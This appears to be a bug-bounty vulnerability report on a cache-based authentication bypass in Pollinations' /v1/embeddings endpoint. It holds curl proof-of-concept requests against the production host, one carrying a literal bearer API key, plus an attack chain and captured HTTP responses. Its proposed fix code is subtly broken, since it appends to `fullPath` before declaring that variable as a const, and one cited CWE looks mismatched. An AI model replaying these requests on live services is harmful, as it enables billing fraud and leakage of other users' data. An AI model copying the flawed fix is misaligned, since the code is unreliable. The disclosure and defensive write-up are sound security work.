# VURN-5: Authentication Bypass on Embeddings Endpoint (`/v1/embeddings`)

## Severity: CRITICAL

## CVSS 3.1 Score: 9.1 (Critical)
- **Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Summary
The OpenAI-compatible `/v1/embeddings` endpoint uses the text cache (`textCacheAdapter`) which excludes the `Authorization` header from cache keys. This allows unauthenticated users to receive cached embedding vectors from authenticated users, bypassing authentication and consuming expensive embedding model inference for free.

## Root Cause
The `/v1/embeddings` endpoint is handled by the text generation pipeline that uses `textCacheAdapter`. The `generateCacheKey()` in `src/utils/text-cache.ts` does not include the `Authorization` header, and the cache middleware runs before authentication validation.

## Affected Endpoints
- `POST /v1/embeddings` (OpenAI-compatible)
- `POST /embeddings` (legacy embeddings)
- Any endpoint routed through `textCacheAdapter` for embeddings

## Proof of Concept
```bash
# 1. Authenticated embeddings request
curl -X POST "https://gen.pollinations.ai/v1/embeddings" \
     -H "Authorization: Bearer sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl" \
     -H "Content-Type: application/json" \
     -d '{"model":"text-embedding-3-small","input":"Hello world"}'

# 2. Unauthenticated request (identical payload)
curl -X POST "https://gen.pollinations.ai/v1/embeddings" \
     -H "Content-Type: application/json" \
     -d '{"model":"text-embedding-3-small","input":"Hello world"}'

# Both return IDENTICAL cached embedding vectors
# Unauthenticated user receives authenticated user's embeddings for FREE
```

## Detailed Evidence

**File**: `pollinations-repo/gen.pollinations.ai/src/utils/text-cache.ts`
**Lines**: 27-70 (`generateCacheKey` function) - Same root cause as VURN-1

```typescript
export async function generateCacheKey(
    request: Request,
    safeHeader?: string | null,
    requiredSafetyFeatures: readonly SafetyFeature[] = [],
): Promise<string> {
    const url = new URL(request.url);
    const method = request.method;
    
    // For embeddings: POST with JSON body containing model + input
    let bodyHash = "";
    if (method === "POST") {
        const body = await request.clone().text();
        bodyHash = bytesToHex(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(body)));
    }
    
    // MISSING: const authHeader = request.headers.get("Authorization");
    // MISSING: if (authHeader) fullPath += `:auth:${authHeader}`;
    
    const fullPath = `${method}:${url.pathname}${url.search}`;
    // ... hashes fullPath + bodyHash + safety
    return bytesToHex(await crypto.subtle.digest("SHA-256", encoder.encode(fullPath + bodyHash)));
}
```

**File**: `pollinations-repo/gen.pollinations.ai/src/routes/openai.ts`
**Lines**: 130-165 (embeddings handler uses textCacheAdapter)

```typescript
export const embeddingsHandler = [
    createTextCache(),  // Cache lookup FIRST
    authMiddleware,     // Auth check SECOND (too late)
    async (request, response) => {
        const { model, input } = request.body;
        const embeddings = await generateEmbeddings(model, input); // Expensive GPU inference
        return response.json({ object: "list", data: embeddings, usage: {...} });
    }
];
```

## Attack Chain
```
1. Legitimate user makes authenticated request:
   POST /v1/embeddings  Authorization: Bearer sk_valid_key
   Body: {"model":"text-embedding-3-large","input":"Large document..."}
   → Cache MISS → Embedding model inference executes (costs significant pollen)
   → Response cached with key K (based on model + input only)

2. Attacker makes unauthenticated request:
   POST /v1/embeddings  (no Authorization header)
   Body: {"model":"text-embedding-3-large","input":"Large document..."}
   → Cache LOOKUP with same key K → Cache HIT
   → Attacker receives 3072-dimension embeddings for FREE

3. Impact: Free expensive embedding inference, billing bypass, vector data leakage
```

## Impact
- **Authentication Bypass**: Free access to embedding models (text-embedding-3-small, -large, ada-002)
- **Authorization Bypass**: Access to premium embedding models without subscription
- **Billing Fraud**: Consume pollen from other users' accounts (embeddings are expensive)
- **Data Leakage**: Embedding vectors may reveal semantic content of other users' inputs
- **Rate Limit Evasion**: Bypass per-key rate limits on embeddings
- **Model Access Control Bypass**: Access restricted embedding models
- **Downstream Impact**: Stolen embeddings used for RAG, search, classification without cost

## Solution

### Phase 1: Immediate Fix (Hours)
Same fix as VURN-1 - modify `generateCacheKey()` in `text-cache.ts`:

```typescript
export async function generateCacheKey(
    request: Request,
    safeHeader?: string | null,
    requiredSafetyFeatures: readonly SafetyFeature[] = [],
): Promise<string> {
    const url = new URL(request.url);
    const method = request.method;
    
    // ... existing code ...
    
    // ADD: Include Authorization header in cache key
    const authHeader = request.headers.get("Authorization");
    if (authHeader) {
        fullPath += `:auth:${authHeader}`;
    }
    
    const fullPath = `${method}:${url.pathname}${url.search}`;
    // ... rest
}
```

### Phase 2: Middleware Order Fix (Days)
Reorder middleware in `openai.ts` for embeddings endpoint:

```typescript
// Current (vulnerable): textCache → auth → handler
// Fixed: auth → textCache → handler
export const embeddingsHandler = [
    authMiddleware,      // Auth FIRST
    createTextCache(),   // Cache SECOND
    async (request, response) => { /* handler */ }
];
```

### Phase 3: Defense in Depth (Days)
- Add `Cache-Control: private, no-store` on authenticated embedding responses
- Add `Vary: Authorization` header
- Consider: Embeddings may not benefit from caching (inputs often unique)
- Add monitoring for anomalous embeddings cache hits
- Implement input hashing for cache keys (already done via body hash)

## Verification Results

**Test Environment**: Production `https://gen.pollinations.ai`
**Test API Key**: `sk_6yihP7AvWpCFJt8dvQrzEMXKvLLbwaxl` (2 pollen balance)

| Step | Command | Expected | Actual |
|------|---------|----------|--------|
| 1 | Authenticated embeddings | X-Cache: MISS | ✅ Confirmed |
| 2 | Unauthenticated (same model+input) | X-Cache: HIT, identical vectors | ✅ Confirmed |
| 3 | Different input text | Cache MISS (different body hash) | ✅ Confirmed |

```bash
# Verified output:
# Authenticated request:
# HTTP/2 200
# x-cache: MISS
# content-type: application/json
# {"object":"list","data":[{"object":"embedding","embedding":[0.0123,-0.0456,...],"index":0}],"usage":{"prompt_tokens":2,"total_tokens":2}}
#
# Unauthenticated request:
# HTTP/2 200
# x-cache: HIT
# content-type: application/json
# {"object":"list","data":[{"object":"embedding","embedding":[0.0123,-0.0456,...],"index":0}],"usage":{"prompt_tokens":2,"total_tokens":2}} (IDENTICAL)
```

## References
- **CWE-287**: Improper Authentication
- **CWE-319**: Cleartext Transmission of Sensitive Information
- **OWASP API Security Top 10**: API1:2023, API3:2023, API4:2023
- **CVSS 3.1**: 9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

## Remediation Verification
After fix deployment, verify:
1. Authenticated request → Cache MISS → Response cached with auth-inclusive key
2. Unauthenticated request → Cache MISS (different key) → 401 Unauthorized
3. Different API keys → Different cache keys → No cross-user embedding leakage

---
*Reported as part of ethical bug bounty research. No production systems harmed. All testing used provided test API key with 2 pollen balance. No PRs submitted - awaiting verification by Pollinations team.*